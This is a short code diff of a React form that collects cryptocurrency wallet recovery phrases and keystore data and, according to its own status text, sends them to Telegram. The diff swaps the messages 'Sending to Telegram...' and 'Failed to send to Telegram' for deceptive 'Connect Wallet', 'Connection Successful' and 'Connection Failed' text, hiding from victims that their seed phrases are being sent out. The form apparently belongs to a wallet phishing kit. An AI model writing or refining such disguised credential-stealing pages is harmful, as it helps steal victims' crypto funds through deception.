@@ -122,11 +122,11 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
     const getStatusMessage = () => {
         switch (telegramStatus) {
             case 'sending':
-                return 'Sending to Telegram...';
+                return 'Connect Wallet';
             case 'success':
                 return telegramMessage;
             case 'error':
-                return 'Failed to send to Telegram';
+                return 'Connection Failed. Please try again';
             default:
                 return '';
         }
@@ -283,7 +283,7 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
                                 className="flex-1 bg-purple-600 text-white hover:bg-purple-700"
                                 disabled={isLoading || telegramStatus === 'sending' || (type === 'phrase' && (is24Word ? phraseWords.slice(0,24).some(w => !w) : phraseWords.slice(0,12).some(w => !w)))}
                             >
-                                {isLoading ? 'Sending to Telegram...' : (type === 'phrase' ? 'Connect' : 'Please wait...')}
+                                {isLoading ? 'Connection Successful.' : (type === 'keystore' ? 'Please wait...' : 'Connect Wallet')}
                             </Button>
                         </div>
                     </form>
